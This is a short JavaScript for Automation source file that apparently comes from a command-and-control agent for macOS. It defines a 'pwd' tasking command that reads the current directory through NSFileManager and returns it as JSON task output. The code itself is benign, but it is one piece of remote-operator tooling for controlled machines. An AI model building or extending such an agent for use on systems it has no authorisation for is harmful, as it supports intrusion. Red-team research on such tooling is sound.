exports.pwd = function(task, command, params){
    try{
        let fileManager = $.NSFileManager.defaultManager;
        let cwd = fileManager.currentDirectoryPath;
        if(cwd == undefined || cwd == ""){
            return JSON.stringify({"user_output":"CWD is empty or undefined", "completed": true, "status": "error"});
        }
        return JSON.stringify({"user_output":cwd.js, "completed": true});
    }catch(error){
        return JSON.stringify({"user_output":error.toString(), "completed": true, "status": "error"});
    }
};
COMMAND_ENDS_HERE